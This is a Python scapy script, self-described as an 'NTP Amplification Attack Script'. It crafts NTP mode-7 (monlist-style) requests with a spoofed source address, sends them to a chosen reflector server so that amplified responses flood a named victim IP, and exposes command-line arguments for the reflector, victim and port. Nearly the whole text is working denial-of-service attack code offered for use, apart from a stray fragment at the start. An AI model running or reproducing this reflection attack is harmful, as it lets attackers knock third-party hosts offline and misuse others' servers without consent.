at import argparse
from scapy.all import *

def build_ntp_request():
    # NTP control message (mode 7) for a generic request (monlist no longer widely supported)
    # This packet triggers an amplified response on older/vulnerable servers
    data = b'\x17\x00\x03\x2a' + b'\x00' * 4 + b'\x00' * 4 + b'\x00' * 4 + b'\x00' * 4
    return data

def send_ntp_amplification(reflector_ip, victim_ip=None, port=123):
    if victim_ip is None:
        victim_ip = get_if_addr(conf.iface)  # Default to attacker's IP for testing

    ntp_payload = build_ntp_request()

    packet = IP(src=victim_ip, dst=reflector_ip) / UDP(sport=12345, dport=port) / Raw(load=ntp_payload)

    print(f"[+] Sending spoofed NTP request to {reflector_ip} with victim IP {victim_ip}")
    send(packet, verbose=1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTP Amplification Attack Script")
    parser.add_argument("reflector_ip", help="IP address of the NTP reflector (vulnerable server)")
    parser.add_argument("--victim_ip", help="IP address of the victim (defaults to local IP)", default=None)
    parser.add_argument("--port", help="Port number for NTP service (default: 123)", type=int, default=123)

    args = parser.parse_args()
    send_ntp_amplification(args.reflector_ip, args.victim_ip, args.port)
